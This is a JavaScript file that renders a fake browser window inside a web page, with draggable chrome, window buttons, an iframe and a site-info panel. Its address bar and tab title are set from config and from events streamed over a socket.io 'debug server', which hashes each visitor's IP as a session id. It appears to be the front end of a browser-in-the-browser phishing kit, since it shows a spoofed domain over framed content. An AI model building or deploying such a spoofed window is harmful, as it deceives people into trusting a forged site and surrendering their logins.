var minimize = document.getElementById("minimize");
var square = document.getElementById("square");
var exit = document.getElementById("exit");
var titleBar = document.getElementById("tab-bar");
var addressSettingsBtn = document.getElementById("address-settings-btn");
var addressBar = document.getElementById("address-bar");
var contentFrame = document.getElementById("content");
var windowShell = document.getElementById("window");
var showIframeBtn = document.getElementById("show-iframe-btn");
var siteInfoPanel = document.getElementById("site-info-panel");
var sitePanelClose = document.getElementById("site-panel-close");
var tabTitle = document.getElementById("tab-title");
var domainName = document.getElementById("domain-name");

var appConfig = window.appConfig || {};
var iframeSrc = appConfig.iframeSrc || "";
var sitePanelMessage = appConfig.sitePanelMessage || "";
var configuredAddressText = appConfig.addressText || ((appConfig.domainName || "") + (appConfig.domainPath || ""));
var configuredTabTitle = appConfig.tabTitle || "";
var clientIp = appConfig.clientIp || window.__VISITOR_IP__ || "";
var debugIpFromQuery = new URLSearchParams(window.location.search).get("debugIp");
var debugIp = debugIpFromQuery == null ? "" : String(debugIpFromQuery).trim();
var debugServerUrl = appConfig.debugServerUrl || appConfig.logsSocketIoUrl || "";

function appendDebugIpToIframeSrc(src, debugIpValue) {
  if (!src || !debugIpValue) {
    return src || "";
  }

  try {
    var parsedUrl = new URL(src, window.location.href);
    parsedUrl.searchParams.set("debugIp", debugIpValue);
    return parsedUrl.toString();
  } catch (err) {
    var separator = src.indexOf("?") === -1 ? "?" : "&";
    return src + separator + "debugIp=" + encodeURIComponent(debugIpValue);
  }
}

iframeSrc = appendDebugIpToIframeSrc(iframeSrc, debugIp);

var windowPositions = [
  { left: "12%", top: "12%" },
  { left: "46%", top: "22%" }
];

function getRandomPositionIndex(excludeIndex) {
  if (windowPositions.length <= 1) {
    return 0;
  }

  var randomIndex = Math.floor(Math.random() * windowPositions.length);

  if (typeof excludeIndex === "number" && randomIndex === excludeIndex) {
    randomIndex = (randomIndex + 1) % windowPositions.length;
  }

  return randomIndex;
}

var windowPositionIndex = getRandomPositionIndex();

if (tabTitle) {
  tabTitle.textContent = configuredTabTitle;
}

if (domainName) {
  domainName.textContent = configuredAddressText;
}

function setAddressBarText(value) {
  if (!domainName || typeof value !== "string") {
    return;
  }

  domainName.textContent = value;

  if (addressBar) {
    addressBar.setAttribute("title", value);
  }
}

function applyAddressFromEventData(rawValue) {
  if (!domainName || typeof rawValue !== "string") {
    return;
  }

  var value = rawValue.trim();
  if (!value) {
    return;
  }

  try {
    var parsed = new URL(value);
    setAddressBarText(parsed.host + parsed.pathname);
    return;
  } catch (err) {
    // Not a full URL; continue with fallback formatting.
  }

  var sanitizedValue = value.split("?")[0].split("#")[0];
  setAddressBarText(sanitizedValue || value);
}

function applyTabTitleFromEventData(rawValue) {
  if (!tabTitle || typeof rawValue !== "string") {
    return;
  }

  var value = rawValue.trim();
  if (!value) {
    return;
  }

  tabTitle.textContent = value;
}

function consumeLogPayload(payload) {
  if (!payload || typeof payload !== "object") {
    return;
  }

  var addressValue = "";
  var eventType = typeof payload.event_type === "string" ? payload.event_type.trim().toUpperCase() : "";

  if (typeof payload.event_url === "string" && payload.event_url.trim()) {
    addressValue = payload.event_url;
  } else if (eventType === "NAVIGATION" && typeof payload.event_data === "string" && payload.event_data.trim()) {
    addressValue = payload.event_data;
  }

  if (addressValue) {
    applyAddressFromEventData(addressValue);
  }

  if (typeof payload.event_title === "string") {
    applyTabTitleFromEventData(payload.event_title);
  }
}

function consumeInitialLogs(items) {
  if (!Array.isArray(items) || items.length === 0) {
    return;
  }

  var latestLog = items[items.length - 1];
  consumeLogPayload(latestLog);
}

function bufferToHex(buffer) {
  var bytes = new Uint8Array(buffer);
  var hex = "";

  for (var i = 0; i < bytes.length; i += 1) {
    hex += bytes[i].toString(16).padStart(2, "0");
  }

  return hex;
}

function sha256(text) {
  if (!text) {
    return Promise.resolve("");
  }

  if (!window.crypto || !window.crypto.subtle) {
    return Promise.resolve("");
  }

  var encoder = new TextEncoder();

  return window.crypto.subtle.digest("SHA-256", encoder.encode(text)).then(function (hashBuffer) {
    return bufferToHex(hashBuffer);
  });
}

function extractClientIp(value) {
  if (value && typeof value === "object") {
    return (value.ip || value.clientIp || value.address || value.value || "").trim();
  }

  if (typeof value !== "string") {
    return "";
  }

  var trimmedValue = value.trim();

  if (!trimmedValue) {
    return "";
  }

  try {
    var parsedValue = JSON.parse(trimmedValue);

    if (typeof parsedValue === "string") {
      return parsedValue.trim();
    }

    if (parsedValue && typeof parsedValue === "object") {
      return (parsedValue.ip || parsedValue.clientIp || parsedValue.address || parsedValue.value || "").trim();
    }
  } catch (err) {
    // Plain-text response, keep the trimmed value.
  }

  return trimmedValue;
}

function applyDebugIpSuffix(ipValue) {
  if (!ipValue || !debugIp) {
    return ipValue || "";
  }

  if (ipValue.slice(-debugIp.length) === debugIp) {
    return ipValue;
  }

  return ipValue + debugIp;
}

clientIp = applyDebugIpSuffix(clientIp);

function fetchClientIp() {
  if (clientIp) {
    return Promise.resolve(clientIp);
  }

  if (!debugServerUrl) {
    return Promise.resolve("");
  }

  var clientIpUrl = debugServerUrl.replace(/\/$/, "") + "/client-ip";

  if (debugIp) {
    clientIpUrl += "?debugIp=" + encodeURIComponent(debugIp);
  }

  return fetch(clientIpUrl, {
    cache: "no-store",
    credentials: "omit"
  }).then(function (response) {
    if (!response.ok) {
      throw new Error("client-ip request failed: " + response.status);
    }

    return response.clone().json().catch(function () {
      return response.text();
    });
  }).then(function (responseBody) {
    clientIp = applyDebugIpSuffix(extractClientIp(responseBody));
    return clientIp;
  }).catch(function () {
    return clientIp || "";
  });
}

function loadScript(src, onLoad, onError) {
  var existing = document.querySelector('script[data-dynamic-src="' + src + '"]');

  if (existing) {
    if (typeof onLoad === "function") {
      onLoad();
    }
    return;
  }

  var script = document.createElement("script");
  script.src = src;
  script.async = true;
  script.dataset.dynamicSrc = src;
  script.onload = onLoad || null;
  script.onerror = onError || null;
  document.head.appendChild(script);
}

function connectLogsSocketIo() {
  if (!debugServerUrl) {
    return;
  }

  function startSocketIoClient(sessionId) {
    if (typeof window.io !== "function") {
      return;
    }

    var socket = window.io(debugServerUrl, {
      path: "/socket.io",
      forceNew: true,
      transports: ["websocket", "polling"],
      query: {
        debugIp: debugIp
      },
      auth: {
        clientIp: clientIp,
        debugIp: debugIp,
        sessionId: sessionId
      }
    });

    socket.on("initial_logs", function (items) {
      consumeInitialLogs(items);
    });

    socket.on("log", function (payload) {
      consumeLogPayload(payload);
    });

    socket.on("disconnect", function () {
      setTimeout(connectLogsSocketIo, 2000);
    });

    socket.on("connect_error", function () {
      socket.close();
      setTimeout(connectLogsSocketIo, 2000);
    });
  }

  fetchClientIp().then(function (resolvedClientIp) {
    return sha256(resolvedClientIp || clientIp);
  }).then(function (sessionId) {
    console.log("[debug] clientIp:", clientIp, "sessionId(sha256):", sessionId);

    if (typeof window.io === "function") {
      startSocketIoClient(sessionId);
      return;
    }

    var scriptUrl = debugServerUrl.replace(/\/$/, "") + "/socket.io/socket.io.js";

    loadScript(scriptUrl, function () {
      startSocketIoClient(sessionId);
    }, function () {
      setTimeout(connectLogsSocketIo, 2000);
    });
  });
}

connectLogsSocketIo();

if (siteInfoPanel) {
  var messageNode = document.getElementById("site-panel-message");

  if (messageNode) {
    messageNode.textContent = sitePanelMessage;
  }
}

if (contentFrame && iframeSrc) {
  contentFrame.setAttribute("src", iframeSrc);
}

function applyWindowPosition(index) {
  if (!windowShell) {
    return;
  }

  var pos = windowPositions[index];
  windowShell.style.right = "";
  windowShell.style.bottom = "";
  windowShell.style.left = pos.left;
  windowShell.style.top = pos.top;
}

if (windowShell) {
  applyWindowPosition(windowPositionIndex);
}

if (showIframeBtn) {
  showIframeBtn.addEventListener("click", function () {
    var wasHidden = windowShell && windowShell.classList.contains("is-hidden");

    if (windowShell) {
      windowShell.classList.remove("is-hidden");
      windowShell.style.display = "";

      // Pick a new random position every click.
      windowPositionIndex = getRandomPositionIndex(windowPositionIndex);
      applyWindowPosition(windowPositionIndex);
    }

    if (contentFrame) {
      if (!contentFrame.getAttribute("src") || wasHidden) {
        // Load the iframe the first time, and refresh it when reopening after close.
        contentFrame.setAttribute("src", iframeSrc);
      }

      contentFrame.classList.remove("is-hidden");
    }
  });
}

function closeSiteInfoPanel() {
  if (!siteInfoPanel) {
    return;
  }

  siteInfoPanel.classList.remove("open");
  siteInfoPanel.setAttribute("aria-hidden", "true");
}

function placeSiteInfoPanel() {
  if (!addressSettingsBtn || !siteInfoPanel) {
    return;
  }

  var buttonRect = addressSettingsBtn.getBoundingClientRect();
  var panelWidth = 320;
  var left = buttonRect.left - 10;
  var maxLeft = window.innerWidth - panelWidth - 12;

  siteInfoPanel.style.top = (buttonRect.bottom + 10) + "px";
  siteInfoPanel.style.left = Math.max(12, Math.min(left, maxLeft)) + "px";
}

if (addressSettingsBtn && siteInfoPanel) {
  addressSettingsBtn.addEventListener("click", function (event) {
    event.stopPropagation();
    placeSiteInfoPanel();

    if (siteInfoPanel.classList.contains("open")) {
      closeSiteInfoPanel();
    } else {
      siteInfoPanel.classList.add("open");
      siteInfoPanel.setAttribute("aria-hidden", "false");
    }
  });

  siteInfoPanel.addEventListener("click", function (event) {
    event.stopPropagation();
  });

  if (sitePanelClose) {
    sitePanelClose.addEventListener("click", function () {
      closeSiteInfoPanel();
    });
  }

  if (addressBar) {
    addressBar.addEventListener("mousedown", function (event) {
      if (!addressSettingsBtn.contains(event.target)) {
        closeSiteInfoPanel();
      }
    });
  }

  if (contentFrame) {
    contentFrame.addEventListener("mousedown", function () {
      closeSiteInfoPanel();
    });

    contentFrame.addEventListener("focus", function () {
      closeSiteInfoPanel();
    });
  }

  document.addEventListener("click", function () {
    closeSiteInfoPanel();
  });

  window.addEventListener("resize", function () {
    if (siteInfoPanel.classList.contains("open")) {
      placeSiteInfoPanel();
    }
  });
}

////////////////// Hover listeners //////////////////
minimize.addEventListener('mouseover', function() {
  minimize.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
});

minimize.addEventListener('mouseout', function() {
  minimize.style.backgroundColor = '';
});

square.addEventListener('mouseover', function() {
  square.style.backgroundColor = 'rgba(0, 0, 0, 0.1)';
});

square.addEventListener('mouseout', function() {
  square.style.backgroundColor = '';
});

exit.addEventListener('mouseover', function() {
  exit.style.backgroundColor = '#c42b1c';
  exit.style.color = 'white';
});

exit.addEventListener('mouseout', function() {
  exit.style.backgroundColor = '';
  exit.style.color = '';
});


//////////////// Make window draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#tab-bar');

title.on('mousedown', function(e){
  closeSiteInfoPanel();
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make window draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality
$("#exit").click(function(){
    closeSiteInfoPanel();

    if (windowShell) {
      windowShell.classList.add("is-hidden");
    }

    if (contentFrame) {
      contentFrame.classList.add("is-hidden");
    }
  });

// Maximize button functionality
$("#square").click(enlarge);

function enlarge(){
  if(square.classList.contains("enlarged")){
    $("#window").css("width", "900px");
    $("#content").css("height", "650px");
    $("#square").removeClass("enlarged");
  } else {
    $("#window").css("width", "1200px");
    $("#content").css("height", "800px");
    $("#square").addClass("enlarged");
  }
}